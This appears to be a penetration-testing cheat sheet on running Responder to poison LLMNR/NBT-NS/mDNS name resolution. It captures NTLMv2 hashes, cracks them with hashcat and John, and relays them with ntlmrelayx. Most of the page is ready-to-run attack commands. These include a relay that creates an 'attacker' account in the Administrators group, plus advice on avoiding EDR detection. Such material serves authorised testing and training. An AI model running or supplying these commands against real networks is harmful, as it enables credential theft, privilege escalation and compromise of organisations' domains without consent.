# Responder – LLMNR/NBT-NS/MDNS Poisoning & Credential Capture

!!! tip "Tip"
    Run `sudo responder -I tun0 -wrf` as soon as you have internal network access — it passively captures NTLMv2 hashes from any misconfigured name resolution. Crack with `hashcat -m 5600`. If SMB signing is disabled on targets, relay with `ntlmrelayx` instead of cracking.

---

## Running Responder

### Basic Usage

```bash
sudo responder -I tun0
```

- `-I tun0`: Interface to bind to
- `-v`: Verbose mode

### Recommended Usage

```bash
sudo responder -I tun0 -wrf
```

- `-w`: Answer WPAD (Web Proxy Auto-Discovery) requests
- `-r`: Respond to NetBIOS Name Service (NBT-NS) requests
- `-f`: Respond to File/SMB requests

### Logs and Hashes

Responder writes captured hashes to:

```bash
Responder/logs/10.10.10.10-SMB-NTLMv2-<timestamp>.txt
```

---

## Credential Capture (NTLM Hashes)

### NTLMv1/NTLMv2 Format

```
USERNAME::DOMAIN:LMHASH:NTHASH:CHALLENGE:RESPONSE
```

Captured hashes can be cracked offline, relayed via `ntlmrelayx`, or injected with tools like `pth-winexe`, `pth-smbclient`.

---

## Cracking NTLM Hashes

### With Hashcat (NTLMv2 – Mode 5600)

```bash
hashcat -m 5600 responder_hash.txt /usr/share/wordlists/rockyou.txt
```

### With John the Ripper

```bash
john --format=netntlmv2 responder_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Extract Only the Hash

```bash
cut -d ' ' -f 3 responder.log > responder_hashes.txt
```

---

## NTLM Relay Attacks (ntlmrelayx)

### Disable SMB in Responder to Avoid Collision

```bash
sudo responder -I tun0 -wrf --disable-smb
```

### Start ntlmrelayx

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

#### Example `targets.txt`:

```
smb://192.168.1.10
ldap://192.168.1.20
```

### Relay to SMB, Add Admin User

```bash
sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd 'P@ssw0rd123' --group 'Administrators'
```

#### Supported Relay Targets

| Protocol | Actions Available |
| --- | --- |
| SMB | File access, command exec, add user |
| LDAP | Dump domain info, modify AD objects |
| HTTP | Limited use; enumerate or exploit upload endpoints |
| MSSQL | Run SQL queries as authenticated user |

---

## Advanced Configuration

Disable specific protocols in `Responder.conf`:

```bash
sudo nano /etc/responder/Responder.conf
```

```ini
[Responder Core]
SMB = Off
HTTP = On
FTP = Off
DNS = Off
```

Enable only what you need to avoid DoSing targets or triggering EDR.
